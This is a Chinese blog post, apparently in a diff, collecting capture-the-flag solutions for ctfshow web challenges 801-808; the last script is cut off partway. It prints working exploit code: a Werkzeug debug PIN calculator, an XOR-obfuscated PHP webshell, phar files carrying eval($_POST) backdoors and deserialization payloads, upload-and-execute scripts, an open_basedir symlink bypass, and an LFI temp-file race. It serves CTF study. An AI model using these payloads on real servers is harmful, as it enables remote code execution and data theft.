@@ -1,0 +1,708 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>ctfshow常用姿势 |  Hexo</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-ctfshow常用姿势"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  ctfshow常用姿势
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2022/05/16/ctfshow%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/" class="article-date">
+  <time datetime="2022-05-16T12:47:02.000Z" itemprop="datePublished">2022-05-16</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/ctfStudy/">ctfStudy</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">3.3k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">18 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="ctfshow-常用姿势"><a href="#ctfshow-常用姿势" class="headerlink" title="[ctfshow]常用姿势"></a>[ctfshow]常用姿势</h1><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>一些近两年来比赛中常用到的姿势</p>
+<h1 id="web801-flask算pin"><a href="#web801-flask算pin" class="headerlink" title="web801 flask算pin"></a>web801 flask算pin</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Welcome to ctfshow file download system, use /file?filename= to download file,my debug mode is enable.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/file&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>():</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">80</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>读相关文件算pin码即可，记录一下可行的脚本</p>
+<p>md5</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> getpass</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line">username=getpass.getuser() </span><br><span class="line">app = Flask(__name__)</span><br><span class="line">modname=<span class="built_in">getattr</span>(app, <span class="string">&quot;__module__&quot;</span>, app.__class__.__module__)</span><br><span class="line">mod = sys.modules.get(modname)</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    username, <span class="comment">#用户名 一般为root或者读下/etc/passwd</span></span><br><span class="line">    modname,  <span class="comment">#一般固定为flask.app</span></span><br><span class="line">    <span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, app.__class__.__name__), <span class="comment">#固定，一般为Flask</span></span><br><span class="line">    <span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>),    <span class="comment">#flask库下app.py的绝对路径，可以通过报错信息得到</span></span><br><span class="line">]</span><br><span class="line">mac =<span class="string">&#x27;02:42:ac:0c:ac:28&#x27;</span>.replace(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">mac=<span class="built_in">str</span>(<span class="built_in">int</span>(mac,base=<span class="number">16</span>))</span><br><span class="line">private_bits = [</span><br><span class="line">	mac,</span><br><span class="line">	 <span class="string">&quot;机器码&quot;</span></span><br><span class="line">	 ]</span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&quot;__wzd&quot;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line"><span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">num=<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">    num = (<span class="string">&quot;%09d&quot;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line"><span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">rv=<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line">    <span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
+
+<p>sha1:py38适用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> getpass</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> typing <span class="keyword">as</span> t</span><br><span class="line">username=<span class="string">&#x27;root&#x27;</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">modname=<span class="built_in">getattr</span>(app, <span class="string">&quot;__module__&quot;</span>, t.cast(<span class="built_in">object</span>, app).__class__.__module__)</span><br><span class="line">mod=sys.modules.get(modname)</span><br><span class="line">mod = <span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    username, <span class="comment">#用户名</span></span><br><span class="line">    modname,  <span class="comment">#一般固定为flask.app</span></span><br><span class="line">    <span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, app.__class__.__name__), <span class="comment">#固定，一般为Flask</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span>,   <span class="comment">#主程序（app.py）运行的绝对路径</span></span><br><span class="line">]</span><br><span class="line"><span class="built_in">print</span>(probably_public_bits)</span><br><span class="line">mac =<span class="string">&#x27;02:42:ac:0c:ac:28&#x27;</span>.replace(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">mac=<span class="built_in">str</span>(<span class="built_in">int</span>(mac,base=<span class="number">16</span>))</span><br><span class="line">private_bits = [</span><br><span class="line">   mac,<span class="comment">#mac地址十进制</span></span><br><span class="line"> <span class="string">&quot;机器码&quot;</span></span><br><span class="line">     ]</span><br><span class="line"><span class="built_in">print</span>(private_bits)</span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line"><span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line"><span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">rv=<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
+
+<p>需要填的值就一个变化的地方—机器码。旧版的只需要读取&#x2F;proc&#x2F;self&#x2F;cgroup即可，但是新增需要在前面再拼上&#x2F;etc&#x2F;machine-id或者&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id的值</p>
+<h1 id="web802-无字母数字webshell"><a href="#web802-无字母数字webshell" class="headerlink" title="web802 无字母数字webshell"></a>web802 无字母数字webshell</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">&quot;%13%19%13%14%05%0d&quot;</span>^<span class="string">&quot;%60%60%60%60%60%60&quot;</span>)(<span class="string">&quot;%03%01%14%00%06%0c%01%07%00%10%08%10&quot;</span>^<span class="string">&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>直接构造异或拼接，其他方式有很多很多</p>
+<h1 id="web803-phar"><a href="#web803-phar" class="headerlink" title="web803 phar"></a>web803 phar</h1><p>生成phar:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;&lt;?php eval(\$_POST[1]);&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上传&amp;getshell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;/tmp/1.phar&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;./1.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;phar:///tmp/1.phar/test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>:<span class="string">&quot;echo system(&#x27;tac f*&#x27;);&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8dff98b5-c424-42b0-80f2-8cd67b9d0866.challenge.ctf.show/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">r1 = requests.post(url=url,data=data1)</span><br><span class="line"><span class="built_in">print</span>(r1.text)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r2 = requests.post(url=url,data=data2)</span><br><span class="line"><span class="built_in">print</span>(r2.text)</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="web805-反序列化"><a href="#web805-反序列化" class="headerlink" title="web805 反序列化"></a>web805 反序列化</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hacker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;echo system(&#x27;cat f*&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">hacker</span>();</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;&lt;?php eval(\$_POST[1]);&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;/tmp/1.phar&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;./1.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;phar:///tmp/1.phar/test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f41ee967-9ea2-44a4-a865-34628612de63.challenge.ctf.show/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">r1 = requests.post(url=url,data=data1)</span><br><span class="line"><span class="built_in">print</span>(r1.text)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r2 = requests.post(url=url,data=data2)</span><br><span class="line"><span class="built_in">print</span>(r2.text)</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="web804-绕过open-base-dir"><a href="#web804-绕过open-base-dir" class="headerlink" title="web804 绕过open_base_dir"></a>web804 绕过open_base_dir</h1><p>写入1，然后直接下载即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">mkdir(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">mkdir(<span class="string">&quot;C&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;C&quot;</span>);</span><br><span class="line">mkdir(<span class="string">&quot;D&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;D&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">symlink(<span class="string">&quot;A/B/C/D&quot;</span>,<span class="string">&quot;SD&quot;</span>);</span><br><span class="line">symlink(<span class="string">&quot;SD/../../../../ctfshowflag&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">unlink(<span class="string">&quot;SD&quot;</span>);</span><br><span class="line">mkdir(<span class="string">&quot;SD&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h1 id="web806-php无参rce"><a href="#web806-php无参rce" class="headerlink" title="web806 php无参rce"></a>web806 php无参rce</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?code=<span class="built_in">eval</span>(array_pop(<span class="built_in">next</span>(get_defined_vars())));</span><br><span class="line">post直接可以rce</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="web807-反弹shell"><a href="#web807-反弹shell" class="headerlink" title="web807 反弹shell"></a>web807 反弹shell</h1><p>群主的网站，只要curl就能弹shell：<a target="_blank" rel="noopener" href="https://your-shell.com/">https://your-shell.com/</a></p>
+<p>这道题貌似只能curl</p>
+<h1 id="web808-php7-0-Segfault-LFI-or-php-session-LFI"><a href="#web808-php7-0-Segfault-LFI-or-php-session-LFI" class="headerlink" title="web808 php7.0 Segfault LFI or php session LFI"></a>web808 php7.0 <strong>Segfault</strong> LFI or php session LFI</h1><h3 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h3><p>php线程崩溃导致临时文件被保存</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/input|data|phar|log/i&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/tmp&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re </span><br><span class="line">url = <span class="string">&quot;http://13d3ac5b-6c38-41c9-9364-ada319d284d3.challenge.ctf.show/&quot;</span></span><br><span class="line">file=&#123;</span><br><span class="line">	<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;&lt;?php system(&quot;cat /*&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">requests.post(url+<span class="string">&#x27;?file=php://filter/string.strip_tags/resource=/etc/passwd&#x27;</span>,files=file)</span><br><span class="line">r=requests.get(url)</span><br><span class="line"></span><br><span class="line">tmp=re.findall(<span class="string">&#x27;=&gt; (php.*?)\\n&#x27;</span>,r.text,re.S)[-<span class="number">1</span>]</span><br><span class="line">r=requests.get(url+<span class="string">&#x27;?file=/tmp/&#x27;</span>+tmp)</span><br><span class="line"><span 